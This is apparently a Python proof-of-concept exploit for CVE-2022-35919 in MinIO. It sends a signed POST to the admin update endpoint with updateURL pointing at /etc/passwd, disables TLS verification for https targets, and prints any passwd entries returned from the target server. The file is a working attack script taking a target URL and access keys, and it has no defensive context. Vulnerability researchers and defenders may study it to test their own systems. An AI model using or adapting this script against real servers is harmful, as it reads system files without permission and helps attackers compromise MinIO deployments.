import urllib.parse
import requests
import json
import re
import datetime
import argparse
from minio.credentials import Credentials
from minio.signer import sign_v4_s3

class MyMinio:
    def __init__(self, base_url, access_key, secret_key):
        self.credits = Credentials(
            access_key=access_key,
            secret_key=secret_key
        )
        self.url = self.construct_url(base_url)

    def construct_url(self, base_url):
        if base_url.startswith('http://') or base_url.startswith('https://'):
            return base_url.rstrip('/') + '/minio/admin/v3/update?updateURL=%2Fetc%2Fpasswd'
        else:
            raise ValueError('Please enter a URL address that starts with "http://" or "https://" and ends with "/"\n')

    def poc(self):
        datetimes = datetime.datetime.utcnow()
        datetime_str = datetimes.strftime('%Y%m%dT%H%M%SZ')
        urls = urllib.parse.urlparse(self.url)
        headers = {
            'X-Amz-Content-Sha256': 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
            'X-Amz-Date': datetime_str,
            'Host': urls.netloc,
        }
        headers = sign_v4_s3(
            method='POST',
            url=urls,
            region='',
            headers=headers,
            credentials=self.credits,
            content_sha256='e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
            date=datetimes,
        )
        response = self.send_request(headers)
        self.process_response(response)

    def send_request(self, headers):
        try:
            if self.url.startswith('https://'):
                return requests.post(url=self.url, headers=headers, verify=False)
            else:
                return requests.post(url=self.url, headers=headers)
        except Exception as e:
            print(f'Error during HTTP request: {str(e)}')

    def process_response(self, response):
        try:
            message = json.loads(response.text)['Message']
            pattern = r'(\w+):(\w+):(\d+):(\d+):(\w+):(\/[\w\/\.-]+):(\/[\w\/\.-]+)'
            matches = re.findall(pattern, message)
            if matches:
                print('There is CVE-2022-35919 problem with the URL!')
                print('The contents of the /etc/passwd file are as follows:')
                for match in matches:
                    print("{}:{}:{}:{}:{}:{}:{}".format(*match))
            else:
                print('There is no CVE-2022-35919 problem with the URL!')
                print('Here is the response message content:')
                print(message)
        except Exception as e:
            print('Error processing response: {str(e)}')

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="URL of the target. example: http://192.168.1.1:9088/")
    parser.add_argument("-a", "--accesskey", required=True, help="Minio AccessKey of the target. example: minioadmin")
    parser.add_argument("-s", "--secretkey", required=True, help="Minio SecretKey of the target. example: minioadmin")
    args = parser.parse_args()

    minio = MyMinio(args.url, args.accesskey, args.secretkey)
    minio.poc()

if __name__ == '__main__':
    main()
